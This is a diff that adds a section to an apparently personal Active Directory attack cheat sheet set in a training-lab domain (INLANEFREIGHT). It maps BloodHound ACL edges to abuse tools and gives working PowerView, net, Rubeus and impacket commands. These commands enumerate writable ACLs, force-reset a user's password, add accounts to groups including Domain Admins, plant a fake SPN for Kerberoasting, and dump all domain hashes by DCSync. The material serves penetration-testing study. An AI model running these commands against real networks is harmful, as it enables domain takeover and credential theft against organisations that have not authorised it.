@@ -95,6 +95,109 @@ export KRB5CCNAME=Administrator.ccache
 impacket-psexec -k -no-pass <dom>/Administrator@<victim-fqdn>
 ```
 
+### Mapping BloodHound Edges to Tooling
+
+| Edge | Abuse path |
+|------|------------|
+| `ForceChangePassword` | `Set-DomainUserPassword` (PowerView) or bloodyAD `set password` |
+| `Add Members` | `Add-DomainGroupMember` (PowerView) or bloodyAD `add groupMember` |
+| `GenericAll` | Set password / add to group / set SPN for Kerberoasting / set RBCD attribute |
+| `GenericWrite` | Set fake SPN → Kerberoast |
+| `WriteOwner` | `Set-DomainObjectOwner` |
+| `WriteDACL` | `Add-DomainObjectACL` |
+| `AllExtendedRights` | `Set-DomainUserPassword` or `Add-DomainGroupMember` |
+| `AddSelf` | `Add-DomainGroupMember` |
+
+### PowerView ACL Workflow (from a domain-joined Windows host)
+
+#### Auth as your Tier-0 user (if you don't already have a session as them)
+
+```bash
+$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+```
+
+#### Find what you can write
+
+```bash
+## Resolve a name to a SID
+$sid = Convert-NameToSid wley
+
+## ACLs where this principal has any modify rights
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+```
+
+Slower but sometimes clearer — diff every user's ACL against your principal:
+
+```bash
+Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
+
+foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {
+    get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access |
+        Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}
+}
+```
+
+Chain forward — after compromising one ACL edge, check the *next* identity's edges:
+
+```bash
+$sid2 = Convert-NameToSid damundsen
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
+```
+
+> BloodHound is faster for chaining — click your starting principal, **Outbound Control Rights**, follow the path.
+
+### ACL Abuse — PowerView Examples
+
+#### Force-change a downstream user's password
+
+```bash
+$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+Import-Module .\PowerView.ps1
+Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword `
+    -Credential $Cred -Verbose
+```
+
+#### Add a user to a group you control
+
+```bash
+Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+
+## Confirm
+Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+```
+
+#### Set a fake SPN → make a user Kerberoastable
+
+```bash
+Set-DomainObject -Credential $Cred2 -Identity adunn `
+    -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+
+## Then crack the new ticket
+.\Rubeus.exe kerberoast /user:adunn /nowrap
+```
+
+#### GenericWrite → Add yourself to Domain Admins (cmd-prompt method)
+
+```bash
+net group 'Domain Admins' ct059 /add /domain
+```
+
+Then drop into a session as your new admin:
+
+```bash
+$cred = New-Object System.Management.Automation.PSCredential(
+    "INLANEFREIGHT\CT059",
+    (ConvertTo-SecureString "charlie1" -AsPlainText -Force))
+Enter-PSSession -ComputerName DC01 -Credential $cred
+```
+
+#### DCSync once you have the right ACE
+
+```bash
+impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
+```
+
 ### Reference
 
 - Harmj0y's classic AD ACL cheatsheet: <https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993>
